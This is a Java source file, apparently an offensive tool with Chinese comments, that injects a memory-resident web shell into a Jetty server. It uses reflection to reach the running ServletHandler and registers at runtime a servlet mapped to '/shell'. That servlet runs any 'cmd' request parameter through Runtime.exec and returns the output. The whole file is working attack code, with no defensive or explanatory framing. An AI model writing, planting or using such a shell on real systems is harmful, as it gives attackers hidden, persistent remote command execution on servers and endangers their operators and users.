package com.xxx;

import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class cmdServletMemoryShell extends HttpServlet {
    public static class ServletMemoryShell extends HttpServlet {
        protected void doGet(HttpServletRequest req, HttpServletResponse res) throws IOException {
            res.setContentType("text/plain;charset=UTF-8");
            String cmd = req.getParameter("cmd");
            if (cmd == null || cmd.trim().isEmpty()) {
                res.getWriter().println("Usage: ?cmd=whoami");
                return;
            }
            try {
                Process process = Runtime.getRuntime().exec(cmd);
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                     BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {
                    StringBuilder output = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                    }
                    while ((line = errReader.readLine()) != null) {
                        output.append(line).append("\n");
                    }
                    res.getWriter().print(output.toString());
                }
            } catch (Exception e) {
                res.getWriter().println("Error executing command: " + e.getMessage());
            }
        }
    }

    protected void doGet(HttpServletRequest req, HttpServletResponse res) {
        try {
            // 1. 构建 servletHandler
            Thread currentThread = Thread.currentThread();
            Field contextClassLoaderField = Thread.class.getDeclaredField("contextClassLoader");
            contextClassLoaderField.setAccessible(true);
            Object contextClassLoader = contextClassLoaderField.get(currentThread);
            Field _contextField = contextClassLoader.getClass().getDeclaredField("_context");
            _contextField.setAccessible(true);
            Object _context = _contextField.get(contextClassLoader);
            Field _servletHandlerField = _context.getClass().getSuperclass().getSuperclass().getDeclaredField("_servletHandler");
            _servletHandlerField.setAccessible(true);
            Object servletHandler = _servletHandlerField.get(_context);

            // 2. 创建 ServletHolder&添加到 ServletHandler
            Class<?> clazzServletHandler = servletHandler.getClass();
            ClassLoader jettyClassLoader = clazzServletHandler.getClassLoader();
            Class<?> clazzServletHolder = jettyClassLoader.loadClass("org.eclipse.jetty.servlet.ServletHolder");
            Class<?> clazzHolderSource = jettyClassLoader.loadClass("org.eclipse.jetty.servlet.Holder$Source");
            // 2.1 通过 ServletHandler 的 newServletHolder 方法创建
            Method newServletHolderMethod = clazzServletHandler.getMethod("newServletHolder", clazzHolderSource);
            Object holder = newServletHolderMethod.invoke(servletHandler, Enum.valueOf((Class<Enum>) clazzHolderSource, "DESCRIPTOR"));
            // 2.2 设置 name
            Method setNameMethod = clazzServletHolder.getMethod("setName", String.class);
            setNameMethod.invoke(holder, "ServletMemoryShell");
            // 2.3 设置 heldClass
            Method setHeldClassMethod = clazzServletHolder.getMethod("setHeldClass", Class.class);
            setHeldClassMethod.invoke(holder, ServletMemoryShell.class);
            // 2.4 添加到 ServletHandler
            Method addServletMethod = clazzServletHandler.getMethod("addServlet", clazzServletHolder);
            addServletMethod.invoke(servletHandler, holder);

            // 3. 添加 ServletMapping

            Class<?> clazzServletMapping = jettyClassLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
            Object mapping = clazzServletMapping.getDeclaredConstructor().newInstance();
            // 3.1 setServletName("InjectServletMemoryShell")
            Method setServletNameMethod = clazzServletMapping.getMethod("setServletName", String.class);
            setServletNameMethod.invoke(mapping, "ServletMemoryShell");
            // 3.2 setPathSpecs(new String[]{"/shell"})
            Method setPathSpecsMethod = clazzServletMapping.getMethod("setPathSpecs", String[].class);
            setPathSpecsMethod.invoke(mapping, (Object) new String[]{"/shell"});
            // 3.3 加入到 servletHandler
            Method addServletMappingMethod = clazzServletHandler.getMethod("addServletMapping", clazzServletMapping);
            addServletMappingMethod.invoke(servletHandler, mapping);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
